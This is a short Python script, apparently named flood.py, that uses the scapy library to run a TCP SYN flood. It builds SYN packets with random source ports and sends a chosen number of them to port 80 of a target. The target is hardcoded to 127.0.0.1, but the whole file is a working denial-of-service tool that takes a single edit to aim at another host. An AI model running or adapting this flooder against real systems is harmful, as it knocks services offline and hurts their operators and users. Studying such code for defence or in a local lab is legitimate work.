import sys
from scapy.all import send, IP, TCP, RandShort

def syn_flood(target_ip, num_packets):
    target_port = 80  
    print(f"Starting SYN flood on {target_ip}:{target_port} with {num_packets} packets.")
    
     
    packet = IP(dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
    
     
    send(packet, count=num_packets, verbose=0)
    print("Flood complete.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python flood.py <num_packets>")
        print("Example: python flood.py 200")
        sys.exit(1)
    
    target_ip = "127.0.0.1"  
    try:
        num_packets = int(sys.argv[1])
    except ValueError:
        print("Error: Number of packets must be an integer.")
        sys.exit(1)

    syn_flood(target_ip, num_packets)
